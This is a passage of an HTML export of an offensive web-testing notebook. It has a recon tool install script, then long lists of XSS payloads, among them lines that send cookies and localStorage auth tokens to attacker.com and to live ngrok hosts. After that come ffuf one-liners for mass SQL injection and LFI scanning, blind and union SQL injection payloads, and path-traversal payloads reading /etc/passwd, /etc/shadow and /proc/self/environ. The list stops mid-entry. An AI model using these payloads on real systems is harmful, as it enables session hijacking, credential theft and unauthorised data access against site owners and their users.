style="color:#0088ff;font-weight:400"># Update packages and install dependencies</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> apt-get update<br /><span style="color:#ff9d00;font-weight:700">sudo</span> apt-get install -y python3 python3-pip git curl wget gcc libssl-dev libffi-dev python3-dev<br /><br /><span style="color:#0088ff;font-weight:400"># Install Go</span><br /><span style="color:#ff9d00;font-weight:700">wget</span> https://golang.org/dl/go1.16.3.linux-amd64.tar.gz<br /><span style="color:#ff9d00;font-weight:700">sudo</span> tar -C /usr/local -xzf go1.16.3.linux-amd64.tar.gz<br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&#39;export PATH=$PATH:/usr/local/go/bin&#39;</span> <span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> ~/.zshrc<br /><br /><span style="color:#0088ff;font-weight:400"># Install gospider</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> wget https://github.com/jaeles-project/gospider/releases/download/v1.1.6/gospider_v1.1.6_linux_x86_64.zip<br /><span style="color:#ff9d00;font-weight:700">sudo</span> unzip gospider_v1.1.6_linux_x86_64.zip<br /><span style="color:#ff9d00;font-weight:700">sudo</span> ln <span style="color:#7f0044;font-weight:400">$PWD</span>/gospider_v1.1.6_linux_x86_64/gospider /usr/bin/gospider<br /><span style="color:#ff9d00;font-weight:700">sudo</span> GO111MODULE=on go install github.com/jaeles-project/gospider@latest<br /><br /><span style="color:#0088ff;font-weight:400"># Install paramspider</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> git clone https://github.com/devanshbatham/ParamSpider /opt/ParamSpider<br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&#39;export PATH=$PATH:/opt/ParamSpider&#39;</span> <span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> ~/.zshrc<br /><span style="color:#ff9d00;font-weight:700">sudo</span> ln /opt/ParamSpider/paramspider.py /usr/bin/paramspider<br />python3 /opt/ParamSpider/setup.py build<br />python3 /opt/ParamSpider/setup.py install<br /><span style="color:#ff9d00;font-weight:700">sudo</span> pip3 install /opt/ParamSpider/<br /><br /><span style="color:#0088ff;font-weight:400"># Install Gxss</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> wget https://github.com/KathanP19/Gxss/releases/download/v4.1/Gxss_4.1_Linux_x86_64.tar.gz<br /><span style="color:#ff9d00;font-weight:700">sudo</span> tar -xvf Gxss_4.1_Linux_x86_64.tar.gz<br /><span style="color:#ff9d00;font-weight:700">sudo</span> ln <span style="color:#7f0044;font-weight:400">$PWD</span>/Gxss /usr/bin/Gxss<br /><br /><span style="color:#0088ff;font-weight:400"># Install gau</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> wget https://github.com/lc/gau/releases/download/v2.1.2/gau_2.1.2_linux_amd64.tar.gz<br /><span style="color:#ff9d00;font-weight:700">sudo</span> tar -xvf gau_2.1.2_linux_amd64.tar.gz<br /><span style="color:#ff9d00;font-weight:700">sudo</span> ln <span style="color:#7f0044;font-weight:400">$PWD</span>/gau /usr/bin/gau<br /><br /><span style="color:#0088ff;font-weight:400"># Install dalfox</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> git clone https://github.com/hahwul/dalfox /opt/dalfox<br /><span style="color:#ff9d00;font-weight:700">sudo</span> cd /opt/dalfox/<br /><span style="color:#ff9d00;font-weight:700">sudo</span> go build dalfox.go<br /><span style="color:#ff9d00;font-weight:700">sudo</span> ln -s <span style="color:#7f0044;font-weight:400">$PWD</span>/dalfox /usr/bin/dalfox<br /><br /><span style="color:#0088ff;font-weight:400"># Install qsreplace</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> wget https://github.com/tomnomnom/qsreplace/releases/download/v0.0.3/qsreplace-linux-amd64-0.0.3.tgz<br /><span style="color:#ff9d00;font-weight:700">sudo</span> tar -xvf qsreplace-linux-amd64-0.0.3.tgz<br /><span style="color:#ff9d00;font-weight:700">sudo</span> ln -s <span style="color:#7f0044;font-weight:400">$PWD</span>/qsreplace /usr/bin/qsreplace<br /><br /><span style="color:#0088ff;font-weight:400"># Install katana</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> wget https://github.com/projectdiscovery/katana/releases/download/v1.1.0/katana_1.1.0_linux_amd64.zip<br /><span style="color:#ff9d00;font-weight:700">sudo</span> unzip katana_1.1.0_linux_amd64.zip<br /><span style="color:#ff9d00;font-weight:700">sudo</span> ln -s <span style="color:#7f0044;font-weight:400">$PWD</span>/katana /usr/bin/katana<br /><br /><span style="color:#ff9d00;font-weight:700">source</span> ~/.zshrc<br /><br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;Done! All dependencies installed and tools downloaded&quot;</span><br /></pre></div></p><p></p></div><div class='page'><a name="al_Recon--General_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--XSS_automation--xss_payloads_729.html"></a><h1 class='title level-9'>xss payloads</h1><br/><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onscrollend">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onscrollend</a></p><p></p><p>&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</p><p>&quot;&gt;&lt;svg/onload=confirm(1)&gt;<a href="https://issuu.com/ayoub.yukusawa/docs/xdd"></a></p><p><a href="https://issuu.com/ayoub.yukusawa/docs/xdd"></a>&quot;&gt;&lt;svg onload=alert(1)&gt;</p><p>aaazazaza&quot;&gt;&lt;SvG OnLoAd=prompt(1)&gt;</p><p>azaza&quot;&gt;&lt;iFrAme Src=JaVascript:prompt(1)&gt;</p><p></p><p></p><p></p><p>&lt;img src=x onerror=alert(document.domain)&gt;</p><p>&lt;img/src=x onerror=alert(document.domain)&gt;</p><p>javascript:alert(document.domain)</p><p>javascript:prompt(document.domain)</p><p>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</p><p>&quot;);alert(document.domain);//</p><p>&lt;scr%00ipt&gt;alert(document.domain);&lt;/scr%00ipt&gt;</p><p>&lt;scRipt&gt;alert(document.domain);&lt;/scRipt&gt;</p><p>&lt;scr&lt;script&gt;ipt&gt;alert(document.domain);&lt;/scr&lt;script&gt;ipt&gt;</p><p>&lt;b%00r%00&gt;test&lt;/b%00r%00&gt;&lt;svg/onload=alert(document.domain)&gt;</p><p>&lt;/title&gt;&lt;svg/onload=alert(document.domain)&gt;</p><p>&quot;;alert(document.domain);//</p><p>&#39;)};alert(document.domain);//</p><p>&lt;/script&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</p><p>&quot;&gt;&lt;svg onload=alert(document.domain)&gt;</p><p>&lt;a href=&quot;javascript:alert(document.domain)&quot;&gt;Click me!&lt;/a&gt;</p><p>&lt;input type=&quot;text&quot; value=&quot;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;&gt;</p><p>&lt;iframe src=&quot;javascript:alert(document.domain)&quot;&gt;&lt;/iframe&gt;</p><p>&lt;img src=&quot;javascript:alert(document.domain)&quot;&gt;</p><p>&lt;svg/onload=confirm(1)&gt;</p><p>&lt;img src=x onerror=alert(1)&gt;</p><p>&lt;audio autoplay src=x onerror=alert(1)&gt;</p><p>&lt;video autoplay src=x onerror=alert(1)&gt;</p><p>&lt;body onload=alert(1)&gt;</p><p>&lt;marquee onstart=alert(1)&gt;</p><p>&lt;iframe src=javascript:alert(1)&gt;</p><p>&lt;script&gt;location=&#39;//attacker.com/&#39;+document.cookie;&lt;/script&gt;</p><p>&lt;a href=&quot;javascript:confirm(1)&quot;&gt;Click me!&lt;/a&gt;</p><p>&lt;form action=&quot;javascript:alert(1)&quot;&gt;</p><p>&lt;input type=&quot;image&quot; src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</p><p>&lt;details open ontoggle=alert(1)&gt;</p><p>&lt;textarea autofocus onfocus=alert(1)&gt;&lt;/textarea&gt;</p><p>&lt;img src=x:x onerror=alert(1)&gt;</p><p>&lt;svg onload=location.href=&#39;//attacker.com/&#39;+document.cookie&gt;</p><p>&lt;object data=x onerror=alert(1)&gt;</p><p>&lt;video src=x onerror=alert(1)&gt;</p><p>&lt;embed src=x onerror=alert(1)&gt;</p><p>&lt;isindex action=&quot;javascript:alert(1)&quot;&gt;yiipi&lt;/isindex&gt;</p><p>&lt;svg/onload=promptxss&gt;</p><p>&lt;body/onload=confirmxss&gt;</p><p>&lt;a href=&quot;javascript:document.body.innerHTML=&#39;XSS&#39;&quot;&gt;Click here&lt;/a&gt;</p><p>&lt;img/src/onerror=this.onerror=confirmxss&gt;</p><p>&lt;script&gt;&quot;\74img src=x onerror=alert&#39;xss&#39;&gt;&quot;&lt;/script&gt;</p><p>&lt;iframe/srcdoc=&quot;&lt;svg onload=alertxss&gt;&quot;&gt;</p><p>&lt;audio src onloadstart=alertxss&gt;&lt;/audio&gt;</p><p>&lt;video&gt;&lt;source onerror=alertxss&gt;&lt;/video&gt;</p><p>&lt;math href=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;Click here&lt;/math&gt;</p><p>&lt;marquee/onstart=alertxss&gt;</p><p>&lt;b/onclick=confirmxss&gt;Click me&lt;/b&gt;</p><p>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:alert(&#39;XSS&#39;);&quot;&gt;</p><p>&lt;body onscroll=alert`xss`&gt;&lt;/body&gt;</p><p>&lt;img src=x:alertxss.png&gt;</p><p>&lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;confirm(&#39;XSS&#39;)&quot;&gt;Click me&lt;/a&gt;</p><p>&lt;iframe/onload=alertxss&gt;&lt;/iframe&gt;</p><p>&lt;embed/src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=&quot;&gt;</p><p>&lt;div style=&quot;pointer-events:none&quot;&gt;&lt;a href=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;Click here&lt;/a&gt;&lt;/div&gt;</p><p>&lt;plaintext&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&lt;/plaintext&gt;</p><p>&lt;isindex action=&quot;javascript:prompt(&#39;XSS&#39;)&quot;&gt;Click me&lt;/isindex&gt;</p><p>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;</p><p>&amp;lt;iframe srcdoc=&amp;quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;</p><p>&amp;lt;a href=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;Click me&amp;lt;/a&amp;gt;</p><p>&amp;lt;img src=&amp;quot;x&amp;quot; onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;</p><p>&amp;lt;svg/onload=alert(1)&amp;gt;</p><p>&amp;lt;img src=x onerror=alert(1)&amp;gt;</p><p>&amp;lt;b%20onmouseover=alert(1)&amp;gt;Hover%20over%20me!&amp;lt;/b&amp;gt;</p><p>&amp;lt;div style=&amp;quot;background-image:url(javascript:alert(1))&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;</p><p>&amp;lt;div style=&amp;quot;width:expression(alert(1))&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;</p><p>&amp;lt;video poster=javascript:alert(1)&amp;gt;&amp;lt;/video&amp;gt;</p><p>&amp;lt;marquee/onstart=alert(1)&amp;gt;Move%20me!&amp;lt;/marquee&amp;gt;</p><p>&amp;lt;isindex formaction=javascript:alert(1)&amp;gt;</p><p>&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0;url=javascript:alert(1)&amp;quot;&amp;gt;</p><p>&amp;lt;object data=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;&amp;lt;/object&amp;gt;</p><p>&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;</p><p>&amp;lt;audio autoplay src=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;&amp;lt;/audio&amp;gt;</p><p>&amp;lt;iframe src=&amp;quot;javascript:&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;</p><p>&amp;lt;style&amp;gt;*{background-image:url(javascript:alert(1))}&amp;lt;/style&amp;gt;</p><p>&amp;lt;details open ontoggle=alert(1)&amp;gt;&amp;lt;summary&amp;gt;Click%20me!&amp;lt;/summary&amp;gt;&amp;lt;/details&amp;gt;</p><p>&amp;lt;base href=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;.&amp;quot;&amp;gt;Click me&amp;lt;/a&amp;gt;</p><p>JaVaSCriPt:prompt//${{constructor:alert(1)}}//</p><p>&lt;isindex formaction=&quot;javascript:alert(1)&quot;&gt;yiipi&lt;/isindex&gt;</p><p>&lt;a href=&quot;javascript&amp;#x3a;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;1&amp;#x29;&quot;&gt;click me&lt;/a&gt;</p><p>&lt;input/onfocus=write(1) autofocus&gt;</p><p>&lt;script&gt;setTimeout(function(){}, 5000)&lt;/script&gt;</p><p>&lt;svg onload=setTimeout(function(){},5000)&gt;</p><p>&lt;img src=&quot;image.jpg&quot; onerror=&quot;setTimeout(function(){}, 5000)&quot;&gt;</p><p>&lt;iframe onload=&quot;setTimeout(function(){}, 5000)&quot;&gt;&lt;/iframe&gt;</p><p>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgpfTwvc2NyaXB0Pg==&quot; onreadystatechange=&quot;setTimeout(function(){},5000)&quot;&gt;&lt;/object&gt;</p><p>&lt;video onloadeddata=&quot;setTimeout(function(){}, 5000)&quot;&gt;&lt;/video&gt;</p><p>&lt;audio oncanplay=&quot;setTimeout(function(){}, 5000)&quot;&gt;&lt;/audio&gt;</p><p>&lt;marquee onfinish=&quot;setTimeout(function(){}, 5000)&quot;&gt;&lt;/marquee&gt;</p><p>&lt;details ontoggle=&quot;setTimeout(function(){}, 5000)&quot;&gt;&lt;summary&gt;X&lt;/summary&gt;Y&lt;/details&gt;</p><p>&lt;body onload=setTimeout(function(){},5000);&gt;</p><p>%3Cscript%3EsetTimeout(function(){},10000);%3C/script%3E</p><p>&amp;lt;script&amp;gt;setTimeout(function(){},5000);&amp;lt;/script&amp;gt;</p><p>%253Cscript%253EsetTimeout(function(){},5000);%253C/script%253E</p><p>&amp;#60;script&amp;#62;setTimeout(function(){},5000);&amp;#60;/script&amp;#62;</p><p>\x3Cscript\x3EsetTimeout(function(){},5000);\x3C/script\x3E</p><p></p></div><div class='page'><a name="eneral_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--XSS_automation--tried_and_true_payloads_730.html"></a><h1 class='title level-9'>tried and true payloads</h1><br/><p>azazazaa&quot;&gt;&lt;svg/onload=alert(1)&gt;&lt;</p><p>zaza&quot;&gt;&lt;body+onload=&quot;new+Image().src=&#39;<a href="http://6.tcp.ngrok.io:14953/yup.jpg?output='%2bdocument.cookie;">http://6.tcp.ngrok.io:14953/yup.jpg?output=&#39;%2bdocument.cookie;</a>&quot;&lt;</p><p>zaza&quot;&gt;&lt;body+onload=&quot;new+Image().src=&#39;<a href="http://4.tcp.eu.ngrok.io:18833/yup.jpg?output='%2bdocument.cookie;">http://4.tcp.eu.ngrok.io:18833/Frank.jpg?output=&#39;%2bdocument.cookie;</a>&quot;&lt;</p><p>&lt;embed+codebase%3d&quot;http%3a//4.tcp.eu.ngrok.io:18641/xss.swf%3fc%3d&#39;%2bdocument.domain%3b&quot;&gt;&lt;/embed&gt;</p><p>zaza&quot;&gt;&lt;embed+codebase%3d&quot;http%3a//4.tcp.eu.ngrok.io:18641/xss.swf%3fc%3d&#39;%2bdocument.domain%3b&quot;&gt;&lt;/embed&gt;</p><p>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</p><p>&lt;sCriPt&gt;alert(1)&lt;/sCriPt&gt;</p><p>&quot;&gt;&lt;svg/onload=confirm(1)&gt;<a href="https://issuu.com/ayoub.yukusawa/docs/xdd"></a></p><p><a href="https://issuu.com/ayoub.yukusawa/docs/xdd"></a>&quot;&gt;&lt;svg onload=alert(1)&gt;</p><p>aaazazaza&quot;&gt;&lt;SvG OnLoAd=prompt(1)&gt;</p><p>zasazaza&quot;&gt;&lt;iFrAme Src=JaVaScRipT:prompt(1)&gt;</p><p>aaaada&quot;&gt;&lt;iFraMe sRc=&quot;data:text/html;base64,PFNjUmlwdD5wcm9tcHQoIjEiKTs8L1NjUmlwdD4K&quot;&gt;&lt;/iFraMe&gt;</p><p>aaaada&quot;&gt;&lt;iFraMe sRc=&quot;data:text/html;base64,PFN2RyBvTmxPYWQ9Y29uZmlybSgxKT4K&quot;&gt;&lt;/iFraMe&gt;</p><p>zaza&quot;&gt;&lt;iMg sRC=x ONErRor=prompt(1)&gt;</p><p>asas&quot;&gt;&lt;svg/onload=&#39;eval(atob(&quot;YWxlcnQoMSk=&quot;))&#39;&gt;</p><p>asas&quot;&gt;&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</p><p>&lt;marquee onstart=prompt(1)&gt;</p><p>&lt;audio src onloadstart=confirm(45)&gt;</p><p></p><p></p><p></p><p></p></div><div class='page'><a name="econ--General_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--XSS_automation--XSS_Cookie_Theft_958.html"></a><h1 class='title level-9'>XSS Cookie Theft</h1><br/><p><strong>When Cookies Are Accessible via document.cookie:</strong></p><p>&lt;svg onload=location.href=&#39;//attacker.com/?cookie=&#39;+document.cookie&gt;</p><p>&lt;img src=&#39;//attacker.com/?cookie=&#39;+document.cookie&gt;</p><p>&lt;script&gt;fetch(&#39;//attacker.com/&#39;,{method:&#39;POST&#39;,body:document.cookie})&lt;/script&gt;</p><p>&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;POST&#39;,&#39;//attacker.com/&#39;,true);xhr.send(document.cookie);&lt;/script&gt;</p><p></p><p><strong>When Cookies or Tokens Are Stored in localStorage:</strong></p><p>&lt;script&gt;fetch(&#39;//attacker.com/&#39;,{method:&#39;POST&#39;,body:localStorage.getItem(&#39;authToken&#39;)})&lt;/script&gt;</p><p>&lt;img src=&#39;//attacker.com/?token=&#39;+localStorage.getItem(&#39;authToken&#39;)&gt;</p><p>&lt;svg onload=location.href=&#39;//attacker.com/?token=&#39;+localStorage.getItem(&#39;authToken&#39;)&gt;</p><p></p><p><strong>Combination for Cookies and localStorage:</strong></p><p>&lt;script&gt;fetch(&#39;//attacker.com/&#39;,{method:&#39;POST&#39;,body:&#39;cookie=&#39;+document.cookie+&#39;&amp;token=&#39;+localStorage.getItem(&#39;authToken&#39;)})&lt;/script&gt;</p><p>&lt;svg onload=location.href=&#39;//attacker.com/?cookie=&#39;+document.cookie+&#39;&amp;token=&#39;+localStorage.getItem(&#39;authToken&#39;)&gt;</p><p>&lt;script&gt;fetch(&#39;//attacker.com/&#39;,{method:&#39;POST&#39;,body:localStorage[&#39;g&#39;+&#39;etItem&#39;](&#39;authToken&#39;)})&lt;/script&gt;</p><p></p><p><img src="images/958-1.png" alt="images/958-1.png" /></p><p></p><p>If you see this most likely cant xss outbound</p><p></p></div><div class='page'><a name="eration--Initial_Recon--General_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--SQL_Automation_724.html"></a><h1 class='title level-8'>SQL Automation</h1><br/><p>cat params.txt | qsreplace &#39;FUZZ&#39; &gt; params.tmp</p><p></p><p>cat params.tmp |  while read url; do ffuf -w /opt/tools/webapp/fuzzing/sqli_sleep.txt -u &quot;${url}&quot; -t 50 -mt &#39;&lt;4000&#39; -fc 404 -H &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&quot;; done | tee sqli.txt</p></div><div class='page'><a name="al_Recon--General_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--SQL_Automation--sql_payloads_728.html"></a><h1 class='title level-9'>sql payloads</h1><br/><p>&#39; or 1=1-- </p><p>&quot; or 1=1--</p><p>&#39;) or &#39;1&#39;=&#39;1--</p><p>&quot;) or &quot;1&quot;=&quot;1--</p><p>&#39;)) or ((&#39;1&#39;= &#39;1</p><p>&quot;)) or ((&quot;1&quot;= &quot;1</p><p>&quot; or sleep(10)#</p><p>&#39;;select sleep(5)-- -</p><p>&#39; or sleep(10)#</p><p>&quot; or sleep(10)#</p><p>&#39; union select 1,2,3-- -</p><p>&quot; union select 1,2,3-- -</p><p>&#39; union select null,version()--</p><p>&quot; union select null,version()--</p><p>&#39; and 1=(SELECT COUNT(*) FROM tabname); --</p><p>&quot; and 1=(SELECT COUNT(*) FROM tabname); --</p><p>&#39; or exists(select * from users)--</p><p>&quot; or exists(select * from users)--</p><p>&#39; or sleep(5)=1--</p><p>&quot; or sleep(5)=1--</p><p></p></div><div class='page'><a name="on--General_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--SQL_Automation--sql_sleep_payloads_789.html"></a><h1 class='title level-9'>sql sleep payloads</h1><br/><p>&#39; or sleep(5) --</p><p>&#39;) or sleep(5) or (&#39;1&#39;=&#39;1</p><p>&quot; or sleep(5) or (&quot;1&quot;=&quot;1</p><p>&#39;)); SELECT sleep(5); --</p><p>&quot;)); SELECT sleep(5); --</p><p>&#39; and sleep(5) and &#39;1&#39;=&#39;1</p><p>&quot; and sleep(5) and &quot;1&quot;=&quot;1</p><p>&#39; union select sleep(5),2,3 -- -</p><p>&quot; union select sleep(5),2,3 -- -</p><p>&#39;; waitfor delay &#39;0:0:5&#39; --</p><p>&quot;; waitfor delay &#39;0:0:5&#39; --</p><p>&#39; and extractvalue(1,concat(0x5c,(select sleep(5)),0x5c))--</p><p>&quot; and extractvalue(1,concat(0x5c,(select sleep(5)),0x5c))--</p><p>&#39; and if((select ascii(substring((select database()),1,1)))=97,sleep(5),1)--</p><p>&quot; and if((select ascii(substring((select database()),1,1)))=97,sleep(5),1)--</p><p>&#39;; if((select user())=&#39;root@localhost&#39;, sleep(5),1)--</p><p>&quot;; if((select user())=&quot;root@localhost&quot;, sleep(5),1)--</p><p>&#39; and if(length(database())=7, sleep(5),1)--</p><p>&quot; and if(length(database())=7, sleep(5),1)--</p><p>&#39;; if((select count(*) from information_schema.tables where table_schema=database())=20, sleep(5),1)--</p><p>&quot;; if((select count(*) from information_schema.tables where table_schema=database())=20, sleep(5),1)--</p></div><div class='page'><a name="eration--Initial_Recon--General_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--LFI_Automation_726.html"></a><h1 class='title level-8'>LFI Automation</h1><br/><p><span style="color:#3f4043;">Single target:</span></p><p>paramspider -d <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> -o ./urls.txt &amp;&amp; for URL in $(cat $PWD/params.tmp); do (ffuf -u &quot;$URL&quot; -fc 404 -c -t 15 -mr &#39;root:x:0:0&#39; -w /opt/tools/fuzzing/LFI.txt); done | tee LFI_results.txt</p><p></p><p></p><p><span style="color:#3f4043;">Several targets:</span></p><p>cat URLS.txt | xargs -I {} paramspider -d {} | grep -oE &#39;https?://[^[:space:]]+&#39; | tee -a params.tmp &amp;&amp; for URL in $(cat $PWD/params.tmp); do (ffuf -u &quot;$URL&quot; -fc 404 -c -t 15 -mr &#39;root:x:0:0&#39; -w /opt/tools/fuzzing/LFI.txt); done | tee LFI_results.txt</p><p></p><p></p><p>paramspider -d testphp.vulnweb.com &amp;&amp; for URL in $(cat results/*.txt); do (ffuf -u &quot;$URL&quot; -fc 404 -c -t 15 -mr &#39;root:x:0:0&#39; -w /opt/payloads/lfi.txt); done | tee LFI_results.txt</p><p></p></div><div class='page'><a name="al_Recon--General_methodology--Content_Discovery--Automation_workflow--Automation_Scripts_and_Oneliners--LFI_Automation--lfi_payloads_727.html"></a><h1 class='title level-9'>lfi payloads</h1><br/><p>/.../.../.../.../.../etc/hosts</p><p>/etc/passwd</p><p>//..//..//..//..//..//..//..//..//..//etc/passwd</p><p>//..//..//..//..//..//..//..//..//..//etc/passwd</p><p>\…..\\\…..\\\…..\\\</p><p>%00../../../../../../etc/passwd</p><p>%00/etc/passwd%00</p><p>../../../../../../../../../etc/passwd%00</p><p>../../../../../../../../../etc/passwd</p><p>/etc/issue</p><p>/etc/mysql/my.cnf</p><p>/etc/php5/apache2/php.ini</p><p>/etc/nginx/nginx.conf</p><p>/var/log/dmesg</p><p>/var/log/syslog</p><p>/root/.bash_history</p><p>%00../../../../../../etc/shadow</p><p>..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</p><p>..%00/..%00/..%00/..%00/..%00/etc/passwd</p><p>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00</p><p>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</p><p>%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%2500</p><p>%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd</p><p>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f6574632f7061737377640000</p><p>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f6574632f706173737764</p><p>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%165%164%143%57%144%57%144%00</p><p>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%165%164%143%57%144%57%144</p><p>%00/etc/shadow%00</p><p>%0a/bin/cat%20/etc/passwd</p><p>%0a/bin/cat%20/etc/shadow</p><p>/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00</p><p>%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00</p><p>%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00</p><p>%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini</p><p>/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini</p><p>/../../../../../../../../%2A</p><p>//../../../proc/self/environ</p><p>../../../../../proc/self/environ%00</p><p>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini</p><p>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</p><p>//php://filter/read=convert.base64-encode/resource=../../../../etc/passwd%00</p><p>../../%00/../../%00/../../%00/etc/passwd</p><p>/%c0%afphp://filter/convert.base64-encode/resource=/etc/shadow</p><p>../%252e%252e/%252e%252e/%c0%af%c0%ae/etc/passwd%00</p><p>../../../../../proc/self/environ%23index.php</p><p>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow</p><p>%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd</p><p>%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow</p><p>..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</p><p>..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow</p><p>..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed</p><p>..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd</p><p>..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow</p><p>=3D “/..” . “%2f..</p><p>..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini</p><p>admin/access_log</p><p>/admin/install.php</p><p>../../../administrator/inbox</p><p>/apache2/logs/access_log</p><p>/apache2/logs/access.log</p><p>/apache2/logs/error_log</p><p>/apache2/logs/error.log</p><p>/apache/logs/access_log</p><p>/apache/logs/access.log</p><p>c:\Program Files\Apache Group\Apache\logs\access.log  </p><p>c:\Program Files\Apache 